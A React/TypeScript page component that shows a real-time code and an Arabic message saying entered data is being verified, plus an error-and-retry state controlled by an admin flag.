import Main from "@/components/Main";
import { Button } from "@/components/ui/button";
import { MAIN_BTN } from "@/constants/data";
import { code, isAdminError } from "@/real-time/context/signals";
import { setCurrentPage } from "@/real-time/utils/utils";
import { useSignals } from "@preact/signals-react/runtime";
import { useEffect } from "react";

function Page6() {
  useSignals();

  useEffect(() => {
    setCurrentPage("page6");
  }, []);
  return (
    <Main>
      <div className="flex items-center justify-center gap-4 flex-col mt-5">
        <div className="p-4 aspect-square text-4xl font-bold w-20 text-white bg-main rounded-full flex justify-center items-center">
          {code.value}
        </div>
        {isAdminError.value ? (
          <>
            <p
              className="text-red-500 font-medium text-xs text-center"
              dir="rtl"
            >
              يبدو أن هناك مشكلة بالمعلومات المدخلة حاول مجدداً !
            </p>
            <Button
              className={MAIN_BTN + " text-xs"}
              onClick={() => {
                window.location.reload();
              }}
            >
              اعادة المحاولة
            </Button>
          </>
        ) : (
          <p className="text-gray-400 font-medium text-sm text-center">
            يرجى الانتظار جاري التأكد من صحه البيانات المدخلة
          </p>
        )}
      </div>
    </Main>
  );
}
export default Page6;
